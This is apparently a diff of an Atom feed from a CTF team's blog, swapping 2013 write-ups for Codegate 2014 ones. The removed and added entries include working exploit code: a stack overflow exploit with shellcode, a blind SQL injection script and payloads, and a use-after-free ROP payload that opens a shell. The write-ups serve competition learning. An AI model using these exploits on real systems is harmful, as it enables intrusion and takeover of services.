@@ -4,7 +4,7 @@
   <title><![CDATA[Category: CTF | blue-lotus]]></title>
   <link href="http://www.blue-lotus.net//blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://www.blue-lotus.net//"/>
-  <updated>2014-02-20T20:34:05+08:00</updated>
+  <updated>2014-02-25T13:46:00+08:00</updated>
   <id>http://www.blue-lotus.net//</id>
   <author>
     <name><![CDATA[blue-lotus]]></name>
@@ -14,959 +14,630 @@
 
   
   <entry>
-    <title type="html"><![CDATA[CSAW CTF Quals 2013 Exploitation 300 writeup]]></title>
-    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup/"/>
-    <updated>2013-09-24T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup</id>
-    <content type="html"><![CDATA[<p>That is a network service. I can connect it by netcat. then i must input <strong>username</strong> <strong>password</strong> and seomething else.</p>
+    <title type="html"><![CDATA[Codegate CTF Quals 2014 weirdshark writeup]]></title>
+    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/"/>
+    <updated>2014-02-25T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-weirdshark-writeup</id>
+    <content type="html"><![CDATA[<p>A pcap file is given here for analysis. check type using <code>file</code></p>
 
-<p><img src="http://www.blue-lotus.net/images/2013/nclogin.png" alt="1" /></p>
+<pre><code># file weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7
+weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7: pcap-ng capture file - version 1.0
+</code></pre>
 
-<p>After i analysis the service. I find out the process of login and i find the <strong>username</strong> and <strong>password</strong></p>
+<p>Open the file using wireshark, but no luck, wireshark reports malformed file format and refuse to open it.</p>
 
-<p><img src="http://www.blue-lotus.net/images/2013/username.png" alt="2" /> <img src="http://www.blue-lotus.net/images/2013/password.png" alt="3" /> <img src="http://www.blue-lotus.net/images/2013/dbup.png" alt="4" /></p>
+<p>So we need to extract the packets inside manually.</p>
 
-<p>Then I input username and password. I input a number(<strong>size</strong>) and a string(<strong>buff</strong>). </p>
+<!-- more -->
 
-<p>“size” &gt; 1 and “size” + 1 &lt; 0x400</p>
+<p>Soon I got the file format document <a href="https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html">here</a>, the file format is really simple, it’s organized in blocks, and according to my comprehension, each block contains a single network frame packet.</p>
 
-<p><img src="http://www.blue-lotus.net/images/2013/size.png" alt="5" /></p>
+<p>According to <code>general block structure</code> section in the pcap document, we can easily get the block type, length, and content.</p>
 
-<p>Then I input The buff and the buff must ASCII Characters.</p>
+<p>And as for the packet, there are several levels of network protocol headers, a brief hex view shows that the network traffic are HTTP requests and responses, so the protocol stack should be IP + TCP + HTTP</p>
 
-<p>last the program will open a file. write it to the buff. If the length of buff is more than 0x400. write it to the top 1024 of buff.</p>
+<pre><code>| 6 + 6 bytes MAC addr + 2 bytes (ethertype 08 00) | 20 bytes IP header | 20 bytes TCP header | HTTP Header + HTTP Body |
+</code></pre>
 
-<p>there will be overflow when the program recv the string which you input. but the length of buff must less than 0x400. </p>
+<p>the hard thing here to do manually pcap parse is to assemble TCP packets into byte stream, which require a good understanding of TCP control sequence. But we can assume that the network condition is good, no packet loss or retranssmission happens, just assemble them one by one and see what happens.</p>
 
-<p><code>
-0xffff + 1 == ； 0 0xffff == 65535
-</code></p>
+<p>use the following python code to extract all http content</p>
 
-<p>now we can input any string which we want :)</p>
+<p>```python
+import os, sys, struct</p>
 
-<p>then i will write the exp.</p>
+<p>f = open(‘weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7’).read()
+total = len(f)</p>
 
-<p><code>
-'A' * 0x420 + ret_address
-</code>
-there is not “jmp esp” in program when i use objdump. but the program use the function of read. i can use <strong>read</strong> to write “jmp esp” in static area.</p>
+<h1 id="skip-the-first-two-blocks-which-seems-broken-0x80-and-0x9c-are-the-block-sizes-respectively">skip the first two blocks, which seems broken, 0x80 and 0x9c are the block sizes respectively</h1>
+<p>index = 0x80 + 0x9c</p>
 
-<p>read(fd, buff, buffsize)</p>
+<p>w = open(‘http-content.bin’, ‘w’)</p>
 
-<p>read: call   80486e0 <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;">&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;</a> </p>
+<p>while index &lt; total:
+    block_type = f[index:index+4].encode(‘hex’)
+    block_size = struct.unpack(‘&lt;I’, f[index+4:index+8])[0]
+    captured_len = struct.unpack(‘&lt;I’, f[index+20:index+24])[0]
+    packet_len = struct.unpack(‘&lt;I’, f[index+24:index+28])[0]
+    print index, block_size, packet_len, captured_len, block_type
+    w.write(f[index+28+54:index+28+packet_len])
+    w.flush()
+    index += block_size</p>
 
-<p>fd:4 (the fd of client socket)</p>
+<p>w.close()
+```</p>
 
-<p>read( 4, *0x080486e0, 2)</p>
+<p>The result seems very promising,  just concat the packet contents one by one really works! which indicates the network condition is really good. There are several http requests inside</p>
 
-<p>now the send “jmp esp” and the program will write in memory.</p>
+<pre><code>GET / HTTP/1.1
+GET /favicon.ico HTTP/1.1
+GET /mario.png HTTP/1.1
+GET /favicon.ico HTTP/1.1
+GET /obama.bmp HTTP/1.1
+GET /codegate.jpg HTTP/1.1
+GET /multiple.pdf HTTP/1.1
+GET /grayhash.jpg HTTP/1.1
+</code></pre>
 
-<p><code>
-'A' * 0x420 + read + pop3ret + fd + static_area + "\x90" + shellcode
-</code></p>
+<p>And to my surprise, the flag is not in <code>codegate.jpg</code>, but in <code>multiple.pdf</code></p>
 
-<p>now I did it.use the exp and use <strong>nc</strong> connect remote server.</p>
-
-<p><img src="http://www.blue-lotus.net/images/2013/exp.png" alt="6" /></p>
-
-<p><img src="http://www.blue-lotus.net/images/2013/remote.png" alt="7" /></p>
-
-<h2 id="exp">Exp</h2>
-
-<div><div class="CodeRay">
-  <div class="code"><pre><span class="keyword">import</span> <span class="include">sys</span>, <span class="include">os</span>, <span class="include">time</span>, <span class="include">struct</span>, <span class="include">socket</span>
-
-<span class="keyword">def</span> <span class="function">p32</span>(addr):
-    <span class="keyword">return</span> struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;I</span><span class="delimiter">&quot;</span></span>, addr)
-
-<span class="keyword">def</span> <span class="function">r</span>(s, t=<span class="float">0.1</span>):
-    time.sleep(t)
-    <span class="keyword">return</span> s.recv(<span class="integer">8192</span>)
-
-<span class="keyword">def</span> <span class="function">se</span>(s, buf):
-    s.send(buf)
-
-HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">128.238.66.217</span><span class="delimiter">&quot;</span></span>
-HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">192.168.1.180</span><span class="delimiter">&quot;</span></span>
-PORT = <span class="integer">34266</span>
-
-SHELLCODE = \
-<span class="string"><span class="delimiter">&quot;</span><span class="char">\x31</span><span class="char">\xdb</span><span class="char">\xf7</span><span class="char">\xe3</span><span class="char">\x53</span><span class="char">\x43</span><span class="char">\x53</span><span class="char">\x6a</span><span class="char">\x02</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span> +\
-<span class="string"><span class="delimiter">&quot;</span><span class="char">\x5b</span><span class="char">\x5e</span><span class="char">\x52</span><span class="char">\x68</span><span class="char">\x02</span><span class="char">\x00</span><span class="char">\x11</span><span class="char">\x5c</span><span class="char">\x6a</span><span class="char">\x10</span><span class="char">\x51</span><span class="char">\x50</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\x6a</span><span class="delimiter">&quot;</span></span> +\
-<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x89</span><span class="char">\x41</span><span class="char">\x04</span><span class="char">\xb3</span><span class="char">\x04</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x43</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
-<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x93</span><span class="char">\x59</span><span class="char">\x6a</span><span class="char">\x3f</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x49</span><span class="char">\x79</span><span class="char">\xf8</span><span class="char">\x68</span><span class="char">\x2f</span><span class="delimiter">&quot;</span></span> +\
-<span class="string"><span class="delimiter">&quot;</span><span class="char">\x2f</span><span class="char">\x73</span><span class="char">\x68</span><span class="char">\x68</span><span class="char">\x2f</span><span class="char">\x62</span><span class="char">\x69</span><span class="char">\x6e</span><span class="char">\x89</span><span class="char">\xe3</span><span class="char">\x50</span><span class="char">\x53</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
-<span class="string"><span class="delimiter">&quot;</span><span class="char">\x0b</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span>
-
-s = socket.socket()
-s.connect((HOST, PORT))
-
-<span class="keyword">print</span> r(s)
-se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">csaw2013</span><span class="delimiter">&quot;</span></span>)
-<span class="keyword">print</span> r(s)
-
-se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">S1mplePWD</span><span class="delimiter">&quot;</span></span>)
-<span class="keyword">print</span> r(s)
-se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">65535</span><span class="delimiter">&quot;</span></span>)
-read = p32(<span class="hex">0x80486e0</span>)
-pop3ret = p32(<span class="hex">0x8049110</span>)
-static = p32(<span class="hex">0x804b000</span>)
-fd = p32(<span class="integer">4</span>)
-jmpesp = <span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xe4</span><span class="delimiter">&quot;</span></span>
-buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * (<span class="integer">1056</span> + <span class="integer">0</span>)
-buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * <span class="hex">0x420</span>
-buf += read + pop3ret + fd + static + p32(<span class="integer">2</span>) + static + <span class="string"><span class="delimiter">&quot;</span><span class="char">\x90</span><span class="delimiter">&quot;</span></span> * <span class="integer">100</span> + SHELLCODE
-se(s, buf)
-time.sleep(<span class="integer">5</span>)
-se(s, jmpesp)
-<span class="keyword">print</span> <span class="string"><span class="delimiter">'</span><span class="content">OK!!!</span><span class="delimiter">'</span></span>
-</pre></div>
-</div>
-</div>
-
+<p>FLAG = <code>FORENSICS_WITH_HAXORS</code></p>
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[CSAW CTF Quals 2013 crypto500 writeup]]></title>
-    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup/"/>
-    <updated>2013-09-23T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup</id>
-    <content type="html"><![CDATA[<h2 id="problem-description">Problem Description</h2>
-<p>We’ve found the source to the Arstotzka spies rendevous server, we must find out their new vault key. Source code is <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Crypto/slurp-500/slurp.py">here</a>.</p>
+    <title type="html"><![CDATA[Codegate CTF Quals 2014 weird_snus writeup]]></title>
+    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/"/>
+    <updated>2014-02-25T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-weird_snus-writeup</id>
+    <content type="html"><![CDATA[<h2 id="vulnerabilities">vulnerabilities</h2>
+<ol>
+  <li>Password protection can be easily bypassed by giving a input of ‘0x00’</li>
+  <li>We quickly identified there is a use-after-free bug. After verifying the password, the program runs into an endless command processing mode, where user can input various buffer command to do some strange things. The first letter in each command represents the action to perform. Command A will check if a struct pointer exists, if so, it will call the function pointer in the struct, or it will allocate a new struct. Command D will reallocate the struct can free it later without cleat the struct pointer. So fist calling command D, and then calling command A will trigger a use-after-free crash. If we find somewhere to do the similar size malloc and fill the struct including the function pointer, we could hijack the control of the program.</li>
+</ol>
 
-<p>So we have to crack sha512 puzzle and calc correct hash. At first i was trying to calculate sEphemeralPriv out, but it seems impossible. after some try, I realized that you can just use “n^m mod === something”.</p>
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Luckily we found that there is a command M can do arbitrary size allocation. The path of current working directory will be put in the content of the new allocation. So we can construct a directory, whose path contains evil function pointer. Then we trigger the use-after-free bug mentioned above.</p>
+
+<p>To get a shell, we first put a large amount of ROP payload(system(‘/bin/sh’)) in the environment variable,
+and then we use an <code>add esp</code> gadget in the libc to raise the stack to the place where environment variables are stored in. <code>ulimit -s unlimited</code> trick is used to get rid of libc address randomization.</p>
 
 <h2 id="code">Code</h2>
 
-<div><div class="CodeRay">
-  <div class="code"><pre><span class="comment">#!/usr/bin/python</span>
-<span class="keyword">import</span> <span class="include">os</span>
-<span class="keyword">import</span> <span class="include">sys</span>
-<span class="keyword">import</span> <span class="include">time</span>
-<span class="keyword">import</span> <span class="include">struct</span>
-<span class="keyword">import</span> <span class="include">socket</span>
-<span class="keyword">import</span> <span class="include">telnetlib</span>
-<span class="keyword">import</span> <span class="include">random</span>,<span class="include">hashlib</span>,<span class="include">base64</span>
-<span class="keyword">from</span> <span class="include">hashlib</span> <span class="keyword">import</span> <span class="include">sha512</span>,<span class="include">sha1</span>
+<h3 id="important-addresses">important addresses</h3>
 
-<span class="keyword">def</span> <span class="function">hashToInt</span>(*params):
-    sha=sha512()
-    <span class="keyword">for</span> el <span class="keyword">in</span> params:
-        sha.update(<span class="string"><span class="delimiter">&quot;</span><span class="content">%r</span><span class="delimiter">&quot;</span></span>%el)
-    <span class="keyword">return</span> <span class="predefined">int</span>(sha.hexdigest(), <span class="integer">16</span>)
+<pre><code>system: 0x40079260 
+binsh: 0x401a1b98
 
-
-<span class="keyword">def</span> <span class="function">gs</span>(num):
-    <span class="keyword">return</span> hashlib.sha1(num).digest()
-
-<span class="keyword">def</span> <span class="function">crack</span>(sha_p):
-    <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">crack:</span><span class="delimiter">&quot;</span></span>,sha_p
-    ss=<span class="string"><span class="delimiter">&quot;</span><span class="delimiter">&quot;</span></span>
-    ret=<span class="integer">0</span>
-    <span class="keyword">for</span> keylen <span class="keyword">in</span> <span class="predefined">range</span>(<span class="integer">10</span>,<span class="integer">40</span>):
-        <span class="keyword">for</span> add_1 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">140</span>):
-            <span class="keyword">for</span> add_2 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">10</span>,<span class="integer">140</span>):
-                <span class="keyword">for</span> add_3 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">155</span>):
-                    <span class="keyword">for</span> add_4 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">155</span>):
-                        <span class="keyword">for</span> add_5 <span class="keyword">in</span> <span class="predefined">range</span> (<span class="integer">0</span>,<span class="integer">155</span>):
-                            new_msg=sha_p+<span class="predefined">chr</span>(add_1)+<span class="predefined">chr</span>(add_2)+<span class="predefined">chr</span>(add_3)+<span class="predefined">chr</span>(add_4)+<span class="predefined">chr</span>(add_5)
-                        <span class="keyword">if</span> gs(new_msg)[-<span class="integer">3</span>:]==<span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xff</span><span class="char">\xff</span><span class="delimiter">&quot;</span></span>:
-                            <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">got one %s</span><span class="delimiter">&quot;</span></span>%<span class="predefined">len</span>(new_msg)
-                            <span class="keyword">if</span> <span class="predefined">len</span>(new_msg)==<span class="integer">21</span>:
-                                ss=new_msg
-                                <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">WE CRACK THE PUZZLE %d</span><span class="char">\n</span><span class="delimiter">&quot;</span></span>%<span class="predefined">len</span>(ss)
-                                ret=<span class="integer">1</span>
-                                <span class="keyword">return</span> (ret,ss)
-
-<span class="keyword">return</span> (ret,ss)
-
-<span class="comment">#s = socket.create_connection(('128.238.66.222',7788))</span>
-s = socket.create_connection((<span class="string"><span class="delimiter">'</span><span class="content">127.0.0.1</span><span class="delimiter">'</span></span>,<span class="integer">7788</span>))
-se=<span class="string"><span class="delimiter">&quot;</span><span class="delimiter">&quot;</span></span>
-<span class="keyword">for</span> i <span class="keyword">in</span> <span class="predefined">range</span>(<span class="integer">1</span>,<span class="integer">100</span>):
-    ss=s.recv(<span class="integer">1000</span>)
-    <span class="keyword">print</span> ss
-    sha_p=ss[<span class="predefined">len</span>(ss)-<span class="integer">16</span>:]
-    new_msg=crack(sha_p[-<span class="integer">16</span>:])
-    <span class="keyword">if</span> new_msg[<span class="integer">0</span>]:
-        se=new_msg[<span class="integer">1</span>]
-        <span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">send:</span><span class="delimiter">&quot;</span></span>,se,hashlib.sha1(se).digest()[-<span class="integer">3</span>:]
-        <span class="keyword">break</span>
-
-
-s.send(se)
-<span class="comment">#raw_input()</span>
-N = <span class="integer">59244860562241836037412967740090202129129493209028128777608075105340045576269119581606482976574497977007826166502644772626633024570441729436559376092540137133423133727302575949573761665758712151467911366235364142212961105408972344133228752133405884706571372774484384452551216417305613197930780130560424424943100169162129296770713102943256911159434397670875927197768487154862841806112741324720583453986631649607781487954360670817072076325212351448760497872482740542034951413536329940050886314722210271560696533722492893515961159297492975432439922689444585637489674895803176632819896331235057103813705143408943511591629</span>
-
-index=<span class="integer">28483644508750028902258833085453121291738558908844640378204850915473006274236033891815596646870094954832384471913373171061099388958373536383247454431214837805096635029244738399662911119306089493137122381562794483801525427601711736403424013966624957471463169984161438593701202381673774894874606950326837142168801614196218030413825361835813060325642766963973454456577907567314093695138863251603368180581162185039224604662844750924047132242103613509637088222461132023037724162558095265336717907895786691004801515830247270579025866384571194244368350362690250445425121639616294300827554006418861422621428030154329451920623</span><span class="comment">#17095359415354811031956139176232822755293333580176796651092816713929142596363160518183074582333639666374490434453616522976528693318889544211598801485465809374370977363040240176466544504447562622451988654983833567639785357067606037932165650485806709538575591881306056180364137612491852807151445333929946180083335184143784040034635507293616742432550220001472750029503246943474764484598756871323795898352813684410952415776064654304191774216122857994311730048413954488815342894838841918071841785821830683677234982197021652871796420412165927837273704381564043458200253387672509280296033910910416083249362331740208987494679</span>
-
-cEphemeral=<span class="integer">1</span>
-send_num1=<span class="predefined">str</span>(<span class="predefined">hex</span>(index))[<span class="integer">2</span>:][:-<span class="integer">1</span>]
-send_num2=<span class="predefined">str</span>(<span class="predefined">hex</span>(cEphemeral))[<span class="integer">2</span>:]
-
-s.send(struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">H</span><span class="delimiter">&quot;</span></span>,<span class="predefined">len</span>(send_num1)))
-s.send(send_num1)<span class="comment">#send numberc index--&gt;base number</span>
-
-<span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">1:</span><span class="delimiter">&quot;</span></span>,s.recv(<span class="integer">72</span>)
-<span class="keyword">print</span> <span class="string"><span class="delimiter">&quot;</span><span class="content">2:</span><span class="delimiter">&quot;</span></span>,s.recv(<span class="integer">60</span>)
-
-s.send(struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">H</span><span class="delimiter">&quot;</span></span>,<span class="predefined">len</span>(send_num2)))
-s.send(send_num2)<span class="comment">#send number cEphemeral</span>
-
-salt=<span class="predefined">int</span>(s.recv(<span class="integer">128</span>),<span class="integer">16</span>)
-sEphemeral=<span class="predefined">long</span>(<span class="predefined">int</span>(s.recv(<span class="integer">514</span>),<span class="integer">16</span>))
-                          
-<span class="comment">#print &quot;3:salt:&quot;,salt</span>
-<span class="comment">#print &quot;4:sEphemeral:&quot;,sEphemeral</span>
-tmp=hashToInt(salt,<span class="string"><span class="delimiter">&quot;</span><span class="delimiter">&quot;</span></span>)
-storedKey = <span class="predefined">pow</span>(index,tmp , N)
-cq_sEphemeral=(<span class="integer">3</span> * storedKey) % N
-tmp1=(sEphemeral-cq_sEphemeral)%N
-
-
-<span class="comment">#agreedKey_withouthash = (cEphemeral * index^[sha512(salt, password) * slush])^sEphemeralPriv mod Nwhoami</span>
-<span class="comment">#   cEphemeral=1  --&gt;</span>
-<span class="comment">#agreedKey_withouthash = (index^[sha512(salt, password) * slush])^sEphemeralPriv mod N</span>
-<span class="comment">#cause cEphemeral^^3 mod N =1</span>
-<span class="comment">#so if sha512(salt, password) * slush * sEphemeralPriv mod 3 == 0</span>
-<span class="comment">#agreedKey_withouthash = 1</span>
-<span class="comment">#so we don't need to know sEphemeralPriv</span>
-
-slush = hashToInt(cEphemeral, sEphemeral)
-salt=hashToInt(index)
-agreedKey=hashToInt(<span class="integer">1L</span>)
-gennedKey=hashToInt(hashToInt(N) ^ hashToInt(index), hashToInt(index), salt,<span class="predefined">int</span>(cEphemeral), <span class="predefined">long</span>(sEphemeral), agreedKey)
-send_num3=<span class="predefined">str</span>(<span class="predefined">hex</span>(gennedKey))[<span class="integer">2</span>:][:-<span class="integer">1</span>]
-s.send(struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">H</span><span class="delimiter">&quot;</span></span>,<span class="predefined">len</span>(send_num3)))
-s.send(send_num3)
-
-
-<span class="keyword">print</span> s.recv(<span class="integer">1000</span>)
-<span class="keyword">print</span> s.recv(<span class="integer">1000</span>)<span class="comment">#--&gt;flag recv</span>
-<span class="keyword">print</span> s.recv(<span class="integer">1000</span>)
-</pre></div>
-</div>
-</div>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[ASIS CTF Finals 2013 Login]]></title>
-    <link href="http://www.blue-lotus.net//asis-ctf-finals-2013-login/"/>
-    <updated>2013-09-03T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//asis-ctf-finals-2013-login</id>
-    <content type="html"><![CDATA[<p><a href="http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/">http://blog.deadcat.me/writeup/2013/09/01/asis-ctf-finals-2013-login/</a></p>
-
-<p>Description</p>
-
-<pre><code>Login
-
-Points  350     Level   1   Solves  5
-
-Description
-78.38.193.187
-
-Hint:
-$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
+11817d:       81 c4 8c 22 00 00       add    $0x228c,%esp
+0x40079260 - 0x41260 + 0x11817d 0x4015017d   \x7d\x01\x15\x40
 </code></pre>
 
-<p>All you can see is a login form, it always has some SQL injection problem.</p>
+<h3 id="commands">commands</h3>
+<p>Disable libc randomization:</p>
 
-<p>After a lot of testing, finally we find a time-based blind injection in the username.</p>
-
-<p>Using</p>
-
-<pre><code>1' AND BENCHMARK(5000000,MD5(0x123)) AND ''='
+<pre><code>ulimit -s unlimited
 </code></pre>
 
-<p>then we start to using sqlmap to deal with it, but it is too slow and show some mistakes.</p>
+<p>Create a directory and cd to it:</p>
 
-<p>One of my friend write a python script to solve it, then we find some useful infomation. There are three database:</p>
-
-<pre><code>information_schema
-sqli_db
-test
+<pre><code>python -c 'import os; os.makedirs("/tmp/aaaa/aa\x7d\x01\x15\x40")'
 </code></pre>
 
-<p>Obviously, sqli_db is suspicious, let’s see what it has.</p>
+<p>Set ROP payloads in an environment variable and trigger use-after-free bug. Notice that the python variable <code>o</code> should be adjusted to achieve the stack alignment. The number below is just an example.</p>
 
-<pre><code>users
+<pre><code>export EXPLOIT=$(python -c 'o = 4; print "a" * o + "\x60\x92\x07\x40\x60\x92\x07\x40\x98\x1b\x1a\x40\x98\x1b\x1a\x40" * 2000+"a" * (8 - o)'); (python -c 'print "\x00\nkelwin\nA\nM\nG\x10\x00\x00\x00\nA\n"'; echo "cat /home/strongest_snus/flag"; cat ) | /home/strongest_snus/weird_snus \(
 </code></pre>
-
-<p>It only has a table named users.</p>
-
-<pre><code>user_id
-user_name
-user_email
-user_password_hash
-</code></pre>
-
-<p>At the beginning, we trying to fetch some data from it, but it is empty, some time later, we fetch a string from user_password_hash.</p>
-
-<pre><code>$2y$10$gyI0vxnE3ZncmdLNGVmwTew/aPwBZPY4cEMCRENAjN4?0l8iu9O5R6iW
-</code></pre>
-
-<p>Just google “$2y$10″, we find it is the head of PHP blowfish hash, but it seems that there is no way to get the original value from it.</p>
-
-<p>At that time, the admin give a hint on this problem:</p>
-
-<pre><code>Hint:
-$2y$10$HXDsGCYFW5ajuzYO5qcyfOygl5r27BQB5DkL5ZfgoTfPSRMhlUAnG
-</code></pre>
-
-<p>At the same time, we find that the table users suddenly become empty. It inspire us to try INSERT.</p>
-
-<pre><code>';insert into users values (333,'hqd','1','1@1.com');select '
-</code></pre>
-
-<p>And it works!</p>
-
-<p>Then it is so easy, just INSERT the correct hash value of a password u know it before, there is a php script can to do this.</p>
-
-<pre><code>';insert into users values (333,'hqd','$2y$10$YTNlM2RiNmFiODgzZGM2YuYqP7NHnuZ31TyucetPJkODqia/XH5KC','1@1.com');select '
-
-#this is the blowfish hash value of 'admin'
-</code></pre>
-
-<p>Then just login use username:hqd and password:admin, then here is the flag.</p>
-
-<pre><code>ASIS_9689926853009CAAD5BF824863077DC9
-</code></pre>
-
-<p>And taste the flavor of the first blood.</p>
-
-<p>f.py</p>
-
-<pre><code>from httplib import HTTPConnection
-
-HTTPConnection._http_vsn_str = 'HTTP/1.0'
-
-def post_payload( payload ):
-    conn = HTTPConnection( '78.38.193.187' )
-    conn.putrequest( 'POST', '/', skip_accept_encoding=True, skip_host=True )
-    conn.putheader( 'Content-Type', 'application/x-www-form-urlencoded' )
-    conn.putheader( 'Content-Length', str(len(payload)) )
-    conn.endheaders( message_body=payload )
-    resp = conn.getresponse()
-    resp.read()
-
-from urllib import urlencode
-from time import time
-
-def get_bool( expression ):
-    start = time()
-    post_payload( urlencode( dict(
-        login = '',
-        user_password = ' ',
-        user_name = "'OR if(%s,benchmark(1500000,md5(0)),0) AND''='" % expression,
-    ) ) )
-    end = time()
-    print 'Time:', end-start
-    return end-start&amp;gt;0.95
-
-def get_bit( expression ):
-    return '1' if get_bool( expression ) else '0'
-
-from itertools import count
-
-def get_string( expression ):
-    result = ''
-    for i in count( start=1 ):
-        char = ''
-        for j in range(8)[::-1]:
-            print 'Byte %d, Bit %d,' % (i,j),
-            bit = get_bit( 'ascii(substr(%s,%d,1))&amp;gt;&amp;gt;%d&amp;amp;1' % ( expression, i, j ) )
-            print bit
-            char += bit
-        char = int( char, 2 )
-        if char == 0: break
-        result += chr(char)
-    return result
-
-# def get_query( expression ):
-
-
-# print get_string( 'database()' )
-print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73716c695f6462 LIMIT 0,1)' )
-# print get_string( '(SELECT IFNULL(CAST(table_name AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=\'information_shema\' LIMIT 0,1)' )
-# print get_string( '(SELECT IFNULL(CAST(COLUMN_NAME AS CHAR) ,0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'users\' LIMIT 5,1)' )
-# print get_string( '(SELECT CAST(COUNT(*) AS CHAR) FROM users)' )
-# print get_string( '@@datadir' )
-# print get_string( 'user()' )
-# print get_string( 'version()' )
-</code></pre>
-
-<p>a.php</p>
-
-<p>Founded from <a href="http://pastebin.com/y9GKtx0b">pastebin</a></p>
 
 ]]></content>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[ASIS CTF memdump writeup]]></title>
-    <link href="http://www.blue-lotus.net//asis-ctf-memdump-writeup/"/>
-    <updated>2013-09-01T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//asis-ctf-memdump-writeup</id>
-    <content type="html"><![CDATA[<p>This is my first time to solve memory forensic challenge. I learn to use <a href="https://www.volatilesystems.com/default/volatility">volatility</a> from this <a href="http://blog.lse.epita.fr/articles/59-ebctf-2013-for100.html">post</a>.</p>
+    <title type="html"><![CDATA[Codegate CTF Quals 2014 Web Proxy writeup]]></title>
+    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/"/>
+    <updated>2014-02-25T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-web_proxy-writeup</id>
+    <content type="html"><![CDATA[<p><code>
+http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php
+</code></p>
 
-<p>Indicated from the memory dump strings, we know the system is <code>Ubuntu 12.04</code> with the kernel of <code>vmlinuz-3.5.0-23-generic</code>. After building a profile (the step by step procedure is <a href="http://code.google.com/p/volatility/wiki/LinuxMemoryForensics">here</a>), we can use the commands in volatility.</p>
+<p>Here is a GET param named “url”, we could use it to get some header and body informaiton of a webpage.</p>
 
-<pre><code>$ vol.py --profile=LinuxUbuntu1204x64 -f mem.dump linux_pslist
-...
-0xffff88000acf4500 udevd        8112    0       0      0x000000000d06e000 2013-08-26 12:35:50 UTC+0000
-0xffff88000d54ae00 asis-ctf     9425    1000    1000   0x000000000c8c9000 2013-08-26 12:48:54 UTC+0000
-0xffff88000acf2e00 nano         15584   1000    1000   0x000000000d677000 2013-08-26 13:13:42 UTC+0000
-...
+<p>and in the index.php’s source code, we can find this:</p>
